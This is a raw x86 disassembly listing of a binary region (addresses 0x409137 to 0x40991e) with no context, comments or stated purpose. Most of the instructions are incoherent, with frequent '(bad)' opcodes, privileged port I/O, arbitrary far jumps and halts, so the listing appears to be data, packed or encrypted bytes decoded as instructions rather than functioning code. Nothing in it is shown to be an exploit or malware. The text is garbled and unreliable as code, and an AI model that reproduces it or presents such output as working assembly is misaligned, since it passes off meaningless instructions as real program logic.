  409137:	enter  0x9d61,0xa4
  40913b:	xor    DWORD PTR ds:[esi],edi
  40913e:	ds clc 
  409140:	push   esp
  409141:	mov    bh,0x4
  409143:	ret    0x2fa
  409146:	(bad)  
  409147:	sahf   
  409148:	imul   esi,DWORD PTR [esi-0x5615ce35],0xffffffa0
  40914f:	mov    ch,0xe6
  409151:	jmp    0x467c:0x593fd1f4
  409158:	sub    al,0x9
  40915a:	jne    0x4090fc
  40915c:	add    BYTE PTR [edx],bl
  40915e:	lea    ebp,[ebp+eax*4-0x3d1fde0b]
  409165:	imul   ebp,DWORD PTR [edi-0x54],0xfffffff2
  409169:	sub    cl,BYTE PTR [edx+0x5b63e58d]
  40916f:	aas    
  409170:	jns    0x4091b5
  409172:	jmp    0x56cb0606
  409177:	pop    esi
  409178:	loopne 0x409166
  40917a:	xchg   DWORD PTR [ecx-0x470ea21a],eax
  409180:	nop
  409181:	and    DWORD PTR [edx+0x64fcd634],ecx
  409187:	cs ja  0x40910b
  40918a:	cwde   
  40918b:	inc    edi
  40918c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40918d:	push   cs
  40918e:	add    ch,BYTE PTR [eax+0x69ccc779]
  409194:	(bad)  
  409195:	mov    ds:0x9223f370,al
  40919a:	dec    BYTE PTR [esi+0x6f]
  40919d:	add    DWORD PTR [esp+eiz*2-0x7f],edi
  4091a1:	stc    
  4091a2:	push   ds
  4091a3:	push   cs
  4091a4:	js     0x409207
  4091a6:	addr16 dec eax
  4091a8:	mov    ah,0x2e
  4091aa:	aad    0x47
  4091ac:	outs   dx,DWORD PTR ds:[esi]
  4091ad:	fdivr  st,st(4)
  4091af:	out    0x2f,al
  4091b1:	push   ebx
  4091b2:	or     edi,edx
  4091b4:	repz data16 sbb al,0x14
  4091b8:	hlt    
  4091b9:	stos   DWORD PTR es:[edi],eax
  4091ba:	sbb    BYTE PTR [edi],cl
  4091bc:	dec    esi
  4091bd:	xor    BYTE PTR [eax+edx*1+0x2e91db78],al
  4091c4:	fsubr  DWORD PTR [edx-0x47192b35]
  4091ca:	xlat   BYTE PTR ds:[bx]
  4091cc:	shl    BYTE PTR [edx+ecx*4+0x2f],0x88
  4091d1:	repnz hlt 
  4091d3:	sub    al,0xe7
  4091d5:	shr    DWORD PTR [esi-0x6b1bbd71],1
  4091db:	mov    ds:0x6bc11203,eax
  4091e0:	push   esp
  4091e1:	repnz mov esi,0xc7ea1a41
  4091e7:	retf   0x321e
  4091ea:	mov    ds,WORD PTR [edi+0x16]
  4091ed:	sub    al,0x55
  4091ef:	in     eax,dx
  4091f0:	leave  
  4091f1:	lods   al,BYTE PTR ds:[esi]
  4091f2:	mov    bl,0x2e
  4091f4:	(bad)  
  4091f5:	jecxz  0x40920c
  4091f7:	pop    ebx
  4091f8:	inc    ebp
  4091f9:	and    al,0xfc
  4091fb:	mov    ebx,0xd91be9eb
  409200:	push   edx
  409201:	stos   BYTE PTR es:[edi],al
  409202:	adc    dl,0xf2
  409205:	ror    BYTE PTR [ebx+edx*2+0x2a],1
  409209:	dec    eax
  40920a:	rcr    DWORD PTR [edx-0x11265b72],cl
  409210:	repz mov ebx,0xa1f6b0c6
  409216:	inc    esp
  409217:	data16 mov bl,0x10
  40921a:	mov    BYTE PTR [ebx-0xfd12265],bl
  409220:	loope  0x4091b9
  409222:	fadd   QWORD PTR [ecx]
  409224:	retf   0x99f7
  409227:	jo     0x4091ab
  409229:	pop    ds
  40922a:	sub    bl,BYTE PTR [eax+0x7b]
  40922d:	adc    DWORD PTR [ebp+ebp*8+0x46a71046],edx
  409234:	das    
  409235:	into   
  409236:	imul   esi,DWORD PTR [eax+0x1cfe2802],0x2bd1c073
  409240:	sub    esi,edx
  409242:	jno    0x409283
  409244:	popf   
  409245:	mov    ebx,edi
  409247:	aas    
  409248:	addr16 leave 
  40924a:	mov    edx,0xd98ff710
  40924f:	lahf   
  409250:	jns    0x4091f6
  409252:	pop    ds
  409253:	in     al,dx
  409254:	mov    cl,0xe9
  409256:	pop    ecx
  409257:	(bad)  
  409258:	outs   dx,DWORD PTR ds:[esi]
  409259:	jnp    0x409261
  40925b:	or     bh,BYTE PTR [ebx+esi*1]
  40925e:	inc    esp
  40925f:	add    esp,DWORD PTR [ecx-0x70dde511]
  409265:	stc    
  409266:	dec    edx
  409267:	into   
  409268:	out    0x9b,eax
  40926a:	mov    ebp,DWORD PTR [eax+0x5]
  40926d:	imul   eax,DWORD PTR [edi-0x4f],0xffffffe6
  409271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409272:	push   ebp
  409273:	fwait
  409274:	xor    dl,BYTE PTR [edx+0x694e8b4f]
  40927a:	out    dx,eax
  40927b:	push   cs
  40927c:	nop
  40927d:	pop    ebp
  40927e:	(bad)  
  40927f:	or     al,0xc2
  409281:	adc    eax,0xadf2e184
  409286:	sbb    ecx,DWORD PTR [edi+0x6a520d52]
  40928c:	dec    edx
  40928d:	or     BYTE PTR [edx-0x3f8e16cf],ah
  409293:	mov    DWORD PTR [ebx],ebx
  409295:	fild   WORD PTR [ebp-0x19]
  409298:	and    ah,BYTE PTR [esp+edi*2-0x60f163]
  40929f:	pop    esi
  4092a0:	stc    
  4092a1:	mov    edx,0x2bdffe9
  4092a6:	add    al,0x79
  4092a8:	rol    ch,0x79
  4092ab:	arpl   WORD PTR [ecx+0x35],cx
  4092ae:	dec    esi
  4092af:	pop    eax
  4092b0:	mov    gs,WORD PTR [esi+0x5c9e6911]
  4092b6:	and    cl,bh
  4092b8:	lahf   
  4092b9:	add    cl,BYTE PTR ds:0xc180e4cc
  4092bf:	(bad)  
  4092c0:	hlt    
  4092c1:	jp     0x409244
  4092c3:	xchg   esp,eax
  4092c4:	popa   
  4092c5:	je     0x4092b1
  4092c7:	(bad)
  4092cb:	cli    
  4092cc:	mov    ebx,0x26a3d339
  4092d1:	fcmove st,st(0)
  4092d3:	inc    ecx
  4092d4:	inc    ebx
  4092d5:	xchg   edi,eax
  4092d6:	mov    ds:0xd8c1fe0e,eax
  4092db:	rcr    DWORD PTR [esi-0x490bd54d],cl
  4092e1:	adc    ch,al
  4092e3:	add    bl,BYTE PTR [esi]
  4092e5:	je     0x409354
  4092e7:	lock lds edi,FWORD PTR [eax+eax*8+0x26]
  4092ec:	cmp    esp,DWORD PTR [eax+ecx*2]
  4092ef:	mov    al,ds:0x8e38128a
  4092f4:	push   edx
  4092f5:	xor    ah,BYTE PTR [ebp+0x44]
  4092f8:	int    0x6e
  4092fa:	bound  ecx,QWORD PTR [edx+0x6d420b4a]
  409300:	imul   edi,edi,0x60058d30
  409306:	mov    dl,0x41
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	int3   
  40932e:	in     eax,dx
  40932f:	lods   al,BYTE PTR ds:[esi]
  409330:	cmp    al,0x27
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x4092e9
  40933a:	pushf  
  40933b:	pop    eax
  40933c:	sbb    BYTE PTR [eax-0x75],ah
  40933f:	leave  
  409340:	or     al,0xc1
  409342:	sahf   
  409343:	fdivr  DWORD PTR [esi]
  409345:	adc    ebp,DWORD PTR [ecx]
  409347:	xor    ebx,DWORD PTR [edx+0x76670c7a]
  40934d:	div    BYTE PTR [ecx+0x65e0a2a8]
  409353:	lds    esi,FWORD PTR [ecx]
  409355:	aad    0x75
  409357:	mov    bh,bh
  409359:	inc    ebp
  40935a:	ins    BYTE PTR es:[edi],dx
  40935b:	icebp  
  40935c:	test   al,0xa0
  40935e:	pop    eax
  40935f:	dec    edi
  409360:	in     al,dx
  409361:	add    BYTE PTR [edx-0x71],bl
  409364:	imul   esi,DWORD PTR [ecx+0x1e],0x55388bb4
  40936b:	arpl   WORD PTR [eax-0x5f],bx
  40936e:	and    al,0x8c
  409370:	adc    BYTE PTR [edi-0x5a],al
  409373:	mov    bl,0xc9
  409375:	(bad)  
  409376:	cli    
  409377:	in     al,0xb9
  409379:	and    DWORD PTR [ebx+0xd],ebp
  40937c:	leave  
  40937d:	mov    ecx,0x32d8491b
  409382:	fsubr  QWORD PTR [edx+0x41]
  409385:	jne    0x4093bf
  409387:	ins    BYTE PTR es:[edi],dx
  409388:	push   ebp
  409389:	and    eax,0x48cc2cf5
  40938e:	jp     0x409338
  409390:	jmp    0x7f7f563
  409395:	push   ebp
  409396:	push   0x2dfa3cf4
  40939b:	mov    al,cl
  40939d:	lahf   
  40939e:	nop
  40939f:	mov    ch,0x2
  4093a1:	add    bl,BYTE PTR ds:0xe2cb93dd
  4093a7:	out    0xd1,eax
  4093a9:	push   ebp
  4093aa:	adc    DWORD PTR [edx+0x2b],eax
  4093ad:	retf   
  4093ae:	mov    esp,0xb4093d1c
  4093b3:	repnz enter 0xdbac,0x78
  4093b8:	pop    ebp
  4093b9:	addr16 dec esp
  4093bb:	xchg   ebx,eax
  4093bc:	xor    dl,al
  4093be:	fs or  eax,0x6bf798c5
  4093c4:	fs cld 
  4093c6:	push   0xecd2a829
  4093cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093cc:	sbb    eax,0xb0023593
  4093d1:	jecxz  0x409395
  4093d3:	int3   
  4093d4:	mov    ecx,0x807587bb
  4093d9:	in     eax,0x1a
  4093db:	imul   edx,edx,0x54
  4093de:	pushf  
  4093df:	aaa    
  4093e0:	sbb    edi,ecx
  4093e2:	out    0x1c,eax
  4093e4:	fdivr  QWORD PTR [ebx+0x12b6b79c]
  4093ea:	lods   eax,DWORD PTR ds:[esi]
  4093eb:	push   ds
  4093ec:	fwait
  4093ed:	xor    DWORD PTR [ecx],esi
  4093ef:	icebp  
  4093f0:	jl     0x40943b
  4093f2:	data16 add al,BYTE PTR [edx-0x1a]
  4093f6:	in     al,0x14
  4093f8:	popf   
  4093f9:	in     eax,dx
  4093fa:	aam    0x8e
  4093fc:	mov    cl,0x96
  4093fe:	sahf   
  4093ff:	dec    esi
  409400:	imul   DWORD PTR [ecx+0x24c7a794]
  409406:	aaa    
  409407:	push   esi
  409408:	in     al,dx
  409409:	mov    edi,0x84c2cd43
  40940e:	adc    BYTE PTR [ebx],cl
  409410:	add    BYTE PTR [ebx+0x5f],0x1a
  409414:	or     BYTE PTR [edi-0x6462a8ff],bh
  40941a:	adc    BYTE PTR [edi+0x4d8c43df],cl
  409420:	mov    edi,0xd949cdb0
  409425:	mov    bh,BYTE PTR [eax+0x21]
  409428:	inc    ebx
  409429:	inc    esi
  40942a:	(bad)  
  40942b:	cld    
  40942c:	push   es
  40942d:	mov    ebp,0x4e585163
  409432:	mov    esp,0xe0554110
  409437:	xor    ebx,DWORD PTR [esi]
  409439:	lahf   
  40943a:	enter  0x46c9,0x2d
  40943e:	retf   0x4d6b
  409441:	aas    
  409442:	out    dx,eax
  409443:	pop    edi
  409444:	retf   0xee46
  409447:	pop    ecx
  409448:	mov    DWORD PTR [ebx],eax
  40944a:	test   al,0xd5
  40944c:	imul   eax,DWORD PTR [ebx],0xffffffc1
  40944f:	dec    ebx
  409450:	ins    BYTE PTR es:[edi],dx
  409451:	push   edi
  409452:	sbb    eax,0x7d744818
  409457:	xchg   esp,eax
  409458:	js     0x4094cb
  40945a:	mov    ch,0xc5
  40945c:	imul   esi,DWORD PTR [ecx-0x3b],0x75
  409460:	shr    edx,cl
  409462:	push   es
  409463:	imul   ebx,DWORD PTR [ecx-0x2b],0xfffffffb
  409467:	xor    BYTE PTR [ebx+0x7f],ch
  40946a:	mov    ch,0x3c
  40946c:	in     al,dx
  40946d:	sub    BYTE PTR [esi-0x42],0xa4
  409471:	call   0x45601e3d
  409476:	xchg   edi,eax
  409477:	mov    edi,ss
  409479:	and    BYTE PTR [ebp+0x5c],ch
  40947c:	push   ss
  40947d:	iret   
  40947e:	lods   eax,DWORD PTR ds:[esi]
  40947f:	jo     0x4094d7
  409481:	(bad)  
  409482:	fcmovbe st,st(0)
  409484:	jb     0x4094b0
  409486:	(bad)  
  409487:	daa    
  409488:	xor    BYTE PTR [edx*4+0x197489f0],al
  40948f:	shl    BYTE PTR [eax-0x3],1
  409492:	les    ebp,FWORD PTR [ecx]
  409494:	in     al,dx
  409495:	clc    
  409496:	mov    ah,0xed
  409498:	dec    esi
  409499:	push   ebp
  40949a:	push   es
  40949b:	outs   dx,BYTE PTR ds:[esi]
  40949c:	xchg   edx,eax
  40949d:	push   ecx
  40949e:	shl    DWORD PTR [esi-0x7fb9ed1d],0x71
  4094a5:	pop    eax
  4094a6:	add    al,0xba
  4094a8:	leave  
  4094a9:	test   al,0xfb
  4094ab:	(bad)  
  4094ad:	aam    0xf7
  4094af:	call   0x3c0ce213
  4094b4:	test   al,0x73
  4094b6:	(bad)  [ebx-0x6]
  4094b9:	loop   0x409526
  4094bb:	and    esp,DWORD PTR ds:0xb26ff1ea
  4094c1:	xchg   ebp,eax
  4094c2:	push   ecx
  4094c3:	arpl   WORD PTR [edx+0x10],sp
  4094c6:	pop    ss
  4094c7:	or     ah,al
  4094c9:	jo     0x40946c
  4094cb:	sub    esi,edx
  4094cd:	xchg   ebx,eax
  4094ce:	mov    BYTE PTR [edi+0x79892def],ah
  4094d4:	adc    BYTE PTR [eax+0x2d],bl
  4094d7:	test   BYTE PTR [edx],dl
  4094d9:	jecxz  0x40951e
  4094db:	and    DWORD PTR [ecx],ecx
  4094dd:	inc    eax
  4094de:	outs   dx,DWORD PTR ds:[esi]
  4094df:	sub    eax,0x4eebfce
  4094e4:	lds    edx,FWORD PTR [edi]
  4094e6:	fmul   DWORD PTR [esi]
  4094e8:	mov    esp,0xdc064d43
  4094ed:	dec    esi
  4094ee:	and    eax,0xe080e56a
  4094f3:	fistp  DWORD PTR [edi]
  4094f5:	sbb    al,0x23
  4094f7:	adc    al,0xc6
  4094f9:	add    BYTE PTR [ebx-0x49],al
  4094fc:	ss popf 
  4094fe:	out    dx,eax
  4094ff:	out    dx,al
  409500:	std    
  409501:	dec    edx
  409502:	adc    DWORD PTR [ebx-0x50],0x4
  409506:	lock out dx,eax
  409508:	sub    eax,0x8e014d2
  40950d:	arpl   WORD PTR [bx+di+0x472d],dx
  409512:	sbb    cl,bl
  409514:	dec    edx
  409515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409516:	mov    ds:0xd93a3581,eax
  40951b:	shl    ch,cl
  40951d:	imul   ebp,DWORD PTR [ebp-0x8bcd999],0xffffffa3
  409524:	pop    ss
  409525:	xchg   BYTE PTR [eax+0x6a],dh
  409528:	inc    edi
  409529:	push   0xab53be6f
  40952e:	int    0x81
  409530:	inc    eax
  409531:	ror    ebx,cl
  409533:	mov    ah,0xc1
  409535:	aad    0x32
  409537:	bound  esp,QWORD PTR [edx+0x5a]
  40953a:	in     al,0x5b
  40953c:	jp     0x4094ff
  40953e:	mul    BYTE PTR [ebp-0x7f]
  409541:	nop
  409542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409543:	sbb    DWORD PTR [ebx+eax*8+0x27a1f774],0xfffffff2
  40954b:	adc    DWORD PTR [ecx+0x4a],0x2c
  40954f:	aas    
  409550:	(bad)  
  409551:	loopne 0x4094e7
  409553:	imul   esi,ebx,0xffffffaa
  409556:	test   eax,0x5ab3c1a9
  40955b:	mov    ds:0x9a045b2f,eax
  409560:	pop    ebx
  409561:	retf   
  409562:	push   0xa03981c2
  409567:	scas   al,BYTE PTR es:[edi]
  409568:	inc    edx
  409569:	gs shl bl,1
  40956c:	or     eax,DWORD PTR [edi+0x29]
  40956f:	scas   al,BYTE PTR es:[edi]
  409570:	addr16 push ebx
  409572:	and    dh,BYTE PTR [eax+0x74238a91]
  409578:	stos   BYTE PTR es:[edi],al
  409579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40957a:	ins    BYTE PTR es:[edi],dx
  40957b:	popf   
  40957c:	sbb    ecx,DWORD PTR [esi+edx*1]
  40957f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409580:	out    0xb9,eax
  409582:	lds    ecx,FWORD PTR [ecx]
  409584:	pop    ebp
  409585:	mov    ?,WORD PTR [esp+edi*2-0x2765aa36]
  40958c:	mov    eax,0x6f394d42
  409591:	xchg   esp,eax
  409592:	daa    
  409593:	jge    0x409545
  409595:	inc    eax
  409596:	add    DWORD PTR [eax+0x48],edx
  409599:	xor    DWORD PTR [eax-0x38314b6c],edi
  40959f:	mov    edx,0x7d67d592
  4095a4:	icebp  
  4095a5:	sti    
  4095a6:	out    0xe9,eax
  4095a8:	add    al,BYTE PTR [ebp+ecx*1-0x61de7b61]
  4095af:	cmp    al,0xfd
  4095b1:	gs cli 
  4095b3:	jo     0x40959e
  4095b5:	inc    edi
  4095b6:	xor    eax,0x104494
  4095bb:	mov    dl,0xb0
  4095bd:	cmp    BYTE PTR [edi+ebp*2+0x43],cl
  4095c1:	xchg   ebp,eax
  4095c2:	sub    eax,0x7b1689f9
  4095c7:	fcmovu st,st(1)
  4095c9:	adc    al,0xdd
  4095cb:	ficomp WORD PTR [edx-0x1ca6d9d]
  4095d1:	scas   al,BYTE PTR es:[edi]
  4095d2:	mov    al,0xf4
  4095d4:	mov    ecx,0x3ad441b1
  4095d9:	test   DWORD PTR [edi-0x3b],ebp
  4095dc:	imul   esp,DWORD PTR [ecx-0x74ece1e0],0xffffffb1
  4095e3:	add    dl,BYTE PTR [edi-0x48]
  4095e6:	sbb    al,0xcf
  4095e8:	pushf  
  4095e9:	aaa    
  4095ea:	dec    esi
  4095eb:	loope  0x40956e
  4095ed:	sbb    esi,DWORD PTR [ecx-0x26]
  4095f0:	sub    edi,DWORD PTR [eax-0x27d47d17]
  4095f6:	(bad)  
  4095f7:	jnp    0x409604
  4095f9:	sti    
  4095fa:	cmp    bl,BYTE PTR [ecx+0x3bbeea9f]
  409600:	jb     0x409606
  409602:	jbe    0x4095dc
  409604:	adc    ebp,DWORD PTR [edi+0x60]
  409607:	mov    al,ds:0x5ba9fea7
  40960c:	jne    0x4095fa
  40960e:	mov    BYTE PTR [ebx-0x3d],bl
  409611:	push   cs
  409612:	cmp    ecx,DWORD PTR [esi]
  409614:	and    al,0x42
  409616:	xchg   edi,eax
  409617:	popf   
  409618:	scas   al,BYTE PTR es:[edi]
  409619:	icebp  
  40961a:	adc    BYTE PTR [ecx],0x3c
  40961d:	stc    
  40961e:	push   ecx
  40961f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409620:	(bad)  [esp+edi*8]
  409623:	in     al,0x96
  409625:	jae    0x409638
  409627:	mov    al,ds:0xab136efc
  40962c:	adc    al,0x5d
  40962e:	sub    ebx,ebx
  409630:	add    DWORD PTR gs:[ebp+0x39],esi
  409634:	enter  0xd765,0xd4
  409638:	gs mov edi,0xbcb24aa0
  40963e:	mov    esp,0xb2036640
  409643:	cdq    
  409644:	sbb    esp,0x41
  409647:	mov    DWORD PTR [ebx+0x13],ebp
  40964a:	shl    bh,1
  40964c:	stc    
  40964d:	dec    ebp
  40964e:	daa    
  40964f:	or     eax,0xae384c71
  409654:	mov    ch,0x8b
  409656:	xchg   WORD PTR [esi+0x78883613],sp
  40965d:	enter  0x74e2,0x5
  409661:	sar    edi,0xeb
  409664:	jae    0x409608
  409666:	das    
  409667:	aad    0x67
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [eax-0x28f23972],edi
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x4096cc
  409693:	or     DWORD PTR [edi+0x77],esp
  409696:	test   DWORD PTR [ecx-0x54],ebx
  409699:	xchg   ecx,eax
  40969a:	add    BYTE PTR [ebp-0x5aab2a23],bh
  4096a0:	ror    BYTE PTR [eax],1
  4096a2:	mov    ebx,0x9e3c8d41
  4096a7:	out    dx,al
  4096a8:	cmp    bl,ch
  4096aa:	iret   
  4096ab:	or     al,BYTE PTR [eax-0x27]
  4096ae:	ins    DWORD PTR es:[edi],dx
  4096af:	sbb    edi,DWORD PTR [ecx]
  4096b1:	out    dx,al
  4096b2:	mov    dh,0xf6
  4096b4:	das    
  4096b5:	mov    bh,0x89
  4096b7:	std    
  4096b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096b9:	dec    esp
  4096ba:	cwde   
  4096bb:	cwde   
  4096bc:	xchg   DWORD PTR [eax+0x1d],ecx
  4096bf:	inc    esp
  4096c0:	stos   BYTE PTR es:[edi],al
  4096c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096c2:	jae    0x40968e
  4096c4:	adc    esi,DWORD PTR [ecx-0x1e]
  4096c7:	sbb    al,BYTE PTR [eax+0x7a1ed4bf]
  4096cd:	retf   0x57d4
  4096d0:	or     dl,dl
  4096d2:	add    al,0x6d
  4096d4:	mov    ebx,0x76ce8b48
  4096d9:	lahf   
  4096da:	loop   0x409683
  4096dc:	outs   dx,DWORD PTR ds:[esi]
  4096dd:	rcr    DWORD PTR [eax-0x3c],cl
  4096e0:	mov    eax,0xf4fc7cfa
  4096e5:	add    BYTE PTR ds:[eax],dl
  4096e8:	stc    
  4096e9:	lods   al,BYTE PTR ds:[esi]
  4096ea:	popa   
  4096eb:	scas   al,BYTE PTR es:[edi]
  4096ec:	imul   edi
  4096ee:	pop    ecx
  4096ef:	mov    ch,0x6e
  4096f1:	pop    ss
  4096f2:	jnp    0x40967c
  4096f4:	sbb    ch,BYTE PTR [ecx+0x74bc2b84]
  4096fa:	addr16 loopne 0x4096c5
  4096fd:	jle    0x4096b4
  4096ff:	mov    esp,gs
  409701:	sti    
  409702:	sbb    eax,0x40c39cf3
  409707:	lods   eax,DWORD PTR ds:[esi]
  409708:	xchg   edi,eax
  409709:	add    DWORD PTR ds:0xd7a317c6,esp
  40970f:	jp     0x4096f8
  409711:	dec    eax
  409712:	or     bl,0x68
  409715:	ds (bad) 
  409718:	add    ebp,esp
  40971a:	or     edx,DWORD PTR [ecx]
  40971c:	fiadd  WORD PTR [eax-0x5]
  40971f:	or     cl,0xfc
  409722:	sbb    eax,0x2ac1da91
  409727:	enter  0x31a6,0x92
  40972b:	ds mov al,0xfa
  40972e:	push   es
  40972f:	imul   ecx,ebx,0x721309a
  409735:	pop    ecx
  409736:	sbb    dh,BYTE PTR [ecx-0x20]
  409739:	push   ecx
  40973a:	push   edx
  40973b:	pop    ebp
  40973c:	sbb    DWORD PTR [esi+0x44],edx
  40973f:	in     eax,0x43
  409741:	sbb    ah,al
  409743:	add    esp,edx
  409745:	xor    edx,DWORD PTR [esi]
  409747:	cmp    ecx,DWORD PTR [ebp-0x7fdc8a44]
  40974d:	xchg   BYTE PTR [eax+0x79e5ac04],ah
  409753:	stos   DWORD PTR es:[edi],eax
  409754:	add    bh,ch
  409756:	es push cs
  409758:	sub    al,0x77
  40975a:	cs test eax,0x7a5a7c1e
  409760:	inc    eax
  409761:	stc    
  409762:	imul   edi,DWORD PTR [ebx],0xaf2fb5d0
  409768:	dec    esi
  409769:	test   DWORD PTR [edx],eax
  40976b:	loope  0x4097df
  40976d:	and    BYTE PTR [edi],cl
  40976f:	pop    ecx
  409770:	pop    ss
  409771:	or     DWORD PTR [esi-0x2],ebx
  409774:	xor    DWORD PTR [ecx+0x5e3dc837],edx
  40977a:	pandn  mm3,QWORD PTR ds:0xfb7c2943
  409781:	xchg   DWORD PTR [esi-0x54],esi
  409784:	in     al,0xc2
  409786:	adc    eax,0x9c44a11f
  40978b:	enter  0xae60,0xc9
  40978f:	pushf  
  409790:	imul   ebx,DWORD PTR [edi+0x554b0710],0xf1437d63
  40979a:	cli    
  40979b:	mov    edx,0x7a6604f7
  4097a0:	mov    edx,0x694c1323
  4097a5:	add    esp,DWORD PTR [edi*8-0x5895af6e]
  4097ac:	shr    DWORD PTR [ebp+0x3e],0x43
  4097b0:	or     ch,cl
  4097b2:	nop
  4097b3:	mov    bl,0x8f
  4097b5:	inc    ebp
  4097b6:	fs adc al,0x3
  4097b9:	hlt    
  4097ba:	push   ecx
  4097bb:	xchg   DWORD PTR [eax],edx
  4097bd:	and    al,0x2c
  4097bf:	ss push 0xdfc9bc81
  4097c5:	cmc    
  4097c6:	add    BYTE PTR [edx+0x31],dl
  4097c9:	or     ah,ah
  4097cb:	mov    dl,0x9f
  4097cd:	sbb    al,0x4b
  4097cf:	mov    al,0x87
  4097d1:	mov    eax,ds:0xe62fdb63
  4097d6:	icebp  
  4097d7:	add    eax,0x9ea6555a
  4097dc:	mov    dl,0x18
  4097de:	adc    eax,0x72ce16d1
  4097e3:	and    eax,0x58f2b82e
  4097e8:	fidivr WORD PTR gs:[ebx]
  4097eb:	jo     0x40983a
  4097ed:	or     al,0xc7
  4097ef:	push   0x7996cb05
  4097f4:	and    cl,BYTE PTR [eax-0x77]
  4097f7:	lods   al,BYTE PTR ds:[esi]
  4097f8:	test   eax,0xba99ae4e
  4097fd:	cmc    
  4097fe:	add    eax,0xfb40484b
  409803:	in     eax,0xdf
  409805:	retf   
  409806:	clc    
  409807:	pop    ss
  409808:	pop    eax
  409809:	popa   
  40980a:	cli    
  40980b:	inc    ecx
  40980c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40980d:	cmp    BYTE PTR [edi-0x12],cl
  409810:	out    0xf,eax
  409812:	cmc    
  409813:	adc    BYTE PTR [eax+0x48],al
  409816:	push   ecx
  409817:	mov    ebp,0x92844baa
  40981c:	stc    
  40981d:	sub    eax,0xa791f46c
  409822:	cmp    DWORD PTR [edi-0x2b],ebx
  409825:	or     al,0xbb
  409827:	fdivr  st,st(1)
  409829:	push   eax
  40982a:	jo     0x409839
  40982c:	mov    esp,edi
  40982e:	dec    ebp
  40982f:	and    ecx,DWORD PTR [esi-0x80]
  409832:	xchg   esp,eax
  409833:	mov    ds:0xa66e28e0,eax
  409838:	(bad)  
  409839:	mov    dh,0x44
  40983b:	pop    esp
  40983c:	test   BYTE PTR ds:0x7c5e8a98,0x89
  409843:	lock xor eax,0x751cc1d9
  409849:	outs   dx,BYTE PTR ds:[esi]
  40984a:	pop    ebp
  40984b:	mov    bl,0x58
  40984d:	dec    edi
  40984e:	jnp    0x409819
  409850:	sbb    eax,0x9d1189b7
  409855:	mov    cl,0xd
  409857:	rcpps  xmm0,XMMWORD PTR [ecx+0x1722662e]
  40985e:	xchg   ebp,eax
  40985f:	push   ecx
  409860:	cld    
  409861:	bound  esi,QWORD PTR ds:0xf920449e
  409867:	sbb    al,0x0
  409869:	lahf   
  40986a:	add    al,BYTE PTR [esi]
  40986c:	jmp    0x40983b
  40986e:	adc    DWORD PTR ss:[ebx+0x6c],0xf7f5a318
  409876:	or     BYTE PTR [ecx+0x58],ch
  409879:	jl     0x4098bf
  40987b:	retf   
  40987c:	ret    0xe406
  40987f:	mov    ch,0xc7
  409881:	jae    0x409822
  409883:	shl    bl,0xe8
  409886:	addr16 mov cl,0xb0
  409889:	neg    dl
  40988b:	dec    edx
  40988c:	fcom   st(1)
  40988e:	sub    DWORD PTR [edi-0x5e85da4d],esi
  409894:	mov    eax,0x23905b3f
  409899:	repz sar DWORD PTR [ecx],cl
  40989c:	inc    ebp
  40989d:	loopne 0x4098cc
  40989f:	call   0xf524:0x51729b72
  4098a6:	mov    esp,0x1dd053ba
  4098ab:	mov    cl,0x4
  4098ad:	in     eax,dx
  4098ae:	pushf  
  4098af:	arpl   ax,si
  4098b1:	call   0xa7cf:0x73f27a55
  4098b8:	inc    esp
  4098b9:	popf   
  4098ba:	push   cs
  4098bb:	xchg   esp,eax
  4098bc:	jns    0x4098ba
  4098be:	jecxz  0x40986c
  4098c0:	sbb    esi,ebp
  4098c2:	cs adc al,0xe0
  4098c5:	mov    ds:0xf96d3486,eax
  4098ca:	popa   
  4098cb:	(bad)  
  4098cc:	jmp    0x40984e
  4098ce:	adc    cl,BYTE PTR [ebp-0x61]
  4098d1:	mov    ebp,0xf2bd40b9
  4098d6:	imul   edx,DWORD PTR [ecx+edi*1],0xf1f02a38
  4098dd:	or     DWORD PTR [ebp-0x71],ecx
  4098e0:	mov    es,WORD PTR [ebp-0x39]
  4098e3:	ret    0xc68f
  4098e6:	xor    bl,dh
  4098e8:	pop    ds
  4098e9:	mov    edi,DWORD PTR [esp+ebp*8-0x6]
  4098ed:	aas    
  4098ee:	ss clc 
  4098f0:	xor    ebx,ebx
  4098f2:	xor    edx,eax
  4098f4:	push   esp
  4098f5:	xchg   ecx,eax
  4098f6:	mov    ?,WORD PTR [eax+0x2c3e332d]
  4098fc:	pusha  
  4098fd:	(bad)  
  4098fe:	mov    esp,0x174ac554
  409903:	or     bl,BYTE PTR [ecx+ecx*2+0x5e]
  409907:	loopne 0x409977
  409909:	std    
  40990a:	jmp    0x4098bd
  40990c:	in     al,0x9d
  40990e:	pop    ebp
  40990f:	retf   
  409910:	inc    ebp
  409911:	mov    dh,0x88
  409913:	push   esp
  409914:	idiv   BYTE PTR ds:0x9a01e662
  40991a:	jno    0x40989d
  40991c:	inc    esp
  40991d:	hlt    
  40991e:	push   cs
